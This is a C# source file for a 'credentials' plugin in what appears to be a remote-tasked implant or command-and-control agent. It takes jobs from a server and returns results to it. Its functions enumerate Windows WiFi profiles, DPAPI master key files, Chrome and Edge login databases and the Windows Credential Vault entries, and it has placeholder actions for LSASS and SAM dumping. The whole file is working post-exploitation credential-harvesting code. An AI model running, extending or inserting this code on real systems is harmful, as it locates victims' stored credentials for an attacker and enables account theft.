using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Xml.Linq;
using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "credentials";
        private IDataBroker messageManager { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            try
            {
                var args = JsonSerializer.Deserialize<credentials.CredentialArgs>(
                    job.task.parameters) ?? new credentials.CredentialArgs();

                string result = args.action switch
                {
                    "wifi-profiles" => GetWifiProfiles(),
                    "vault-enum" => EnumVaults(),
                    "dpapi" => ExtractDpapi(),
                    "lsass-dump" => "LSASS dump is not yet implemented (requires SeDebugPrivilege)",
                    "sam-dump" => "SAM dump is not yet implemented (requires SYSTEM privileges)",
                    _ => throw new ArgumentException($"Unknown action: {args.action}")
                };

                messageManager.AddTaskResponse(new TaskResponse
                {
                    completed = true,
                    user_output = result,
                    task_id = job.task.id
                });
            }
            catch (Exception e)
            {
                DebugLog.Log($"{Name} error: {e.Message} [{job.task.id}]");
                messageManager.Write(e.ToString(), job.task.id, true, "error");
            }
        }

        private string GetWifiProfiles()
        {
            if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                return "WiFi profile enumeration is only available on Windows";

            try
            {
                string profilesPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                    "Microsoft", "Wlansvc", "Profiles", "Interfaces");

                if (!Directory.Exists(profilesPath))
                    return "No WiFi profiles directory found";

                var profiles = new List<string>();
                foreach (string dir in Directory.GetDirectories(profilesPath))
                {
                    foreach (string file in Directory.GetFiles(dir, "*.xml"))
                    {
                        try
                        {
                            var doc = XDocument.Load(file);
                            XNamespace ns = doc.Root?.Name.Namespace
                                ?? XNamespace.None;
                            var el = doc.Descendants(ns + "name")
                                .FirstOrDefault();
                            string name = (string?)el
                                ?? Path.GetFileNameWithoutExtension(file);
                            profiles.Add(name);
                        }
                        catch { }
                    }
                }

                if (profiles.Count == 0)
                    return "No WiFi profiles found";

                return JsonSerializer.Serialize(profiles,
                    new JsonSerializerOptions { WriteIndented = true });
            }
            catch (Exception e)
            {
                return $"Error enumerating WiFi profiles: {e.Message}";
            }
        }

        private string ExtractDpapi()
        {
            if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                return "DPAPI is only available on Windows";

            var sb = new StringBuilder();

            string masterKeyPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Microsoft", "Protect");

            if (Directory.Exists(masterKeyPath))
            {
                sb.AppendLine("DPAPI Master Key SIDs:");
                foreach (var dir in Directory.GetDirectories(masterKeyPath))
                {
                    sb.AppendLine($"  {Path.GetFileName(dir)}");
                    foreach (var file in Directory.GetFiles(dir))
                    {
                        sb.AppendLine($"    Key: {Path.GetFileName(file)}");
                    }
                }
            }

            string chromePath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Google", "Chrome", "User Data");

            if (Directory.Exists(chromePath))
            {
                sb.AppendLine("\nChrome profiles found:");
                foreach (var dir in Directory.GetDirectories(chromePath))
                {
                    string loginData = Path.Combine(dir, "Login Data");
                    if (File.Exists(loginData))
                        sb.AppendLine($"  {Path.GetFileName(dir)}: Login Data present");
                }

                string localState = Path.Combine(chromePath, "Local State");
                if (File.Exists(localState))
                    sb.AppendLine("  Local State file found (contains DPAPI-encrypted key)");
            }

            string edgePath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Microsoft", "Edge", "User Data");

            if (Directory.Exists(edgePath))
            {
                sb.AppendLine("\nEdge profiles found:");
                foreach (var dir in Directory.GetDirectories(edgePath))
                {
                    string loginData = Path.Combine(dir, "Login Data");
                    if (File.Exists(loginData))
                        sb.AppendLine($"  {Path.GetFileName(dir)}: Login Data present");
                }
            }

            if (sb.Length == 0)
                return "No DPAPI-protected credential stores found";

            return sb.ToString();
        }

        private string EnumVaults()
        {
            if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                return "Vault enumeration is only available on Windows";

            var sb = new StringBuilder();

            int result = CredentialsNative.VaultEnumerateVaults(0, out int vaultCount, out IntPtr vaultGuids);
            if (result != 0)
                return $"VaultEnumerateVaults failed: 0x{result:X8}";

            try
            {
                for (int i = 0; i < vaultCount; i++)
                {
                    Guid vaultGuid = Marshal.PtrToStructure<Guid>(
                        IntPtr.Add(vaultGuids, i * Marshal.SizeOf<Guid>()));

                    sb.AppendLine($"Vault: {vaultGuid}");

                    result = CredentialsNative.VaultOpenVault(ref vaultGuid, 0, out IntPtr vaultHandle);
                    if (result != 0)
                    {
                        sb.AppendLine($"  Failed to open: 0x{result:X8}");
                        continue;
                    }

                    try
                    {
                        result = CredentialsNative.VaultEnumerateItems(
                            vaultHandle, 0x200, out int itemCount, out IntPtr items);

                        if (result != 0)
                        {
                            sb.AppendLine($"  Failed to enumerate items: 0x{result:X8}");
                            continue;
                        }

                        sb.AppendLine($"  Items: {itemCount}");

                        for (int j = 0; j < itemCount; j++)
                        {
                            IntPtr itemPtr = IntPtr.Add(items,
                                j * Marshal.SizeOf<CredentialsNative.VAULT_ITEM>());
                            var item = Marshal.PtrToStructure<CredentialsNative.VAULT_ITEM>(itemPtr);

                            string resource = item.pResourceElement != IntPtr.Zero
                                ? Marshal.PtrToStringUni(
                                    Marshal.ReadIntPtr(item.pResourceElement, 16)) ?? "unknown"
                                : "unknown";
                            string identity = item.pIdentityElement != IntPtr.Zero
                                ? Marshal.PtrToStringUni(
                                    Marshal.ReadIntPtr(item.pIdentityElement, 16)) ?? "unknown"
                                : "unknown";

                            sb.AppendLine($"    Resource: {resource}");
                            sb.AppendLine($"    Identity: {identity}");
                            sb.AppendLine($"    Schema: {item.SchemaId}");
                            sb.AppendLine($"    Last Modified: {DateTime.FromFileTime(item.LastModified)}");
                            sb.AppendLine();
                        }
                    }
                    finally
                    {
                        CredentialsNative.VaultCloseVault(ref vaultHandle);
                    }
                }
            }
            finally
            {
                CredentialsNative.VaultFree(vaultGuids);
            }

            if (sb.Length == 0)
                return "No vaults found";

            return sb.ToString();
        }
    }
}
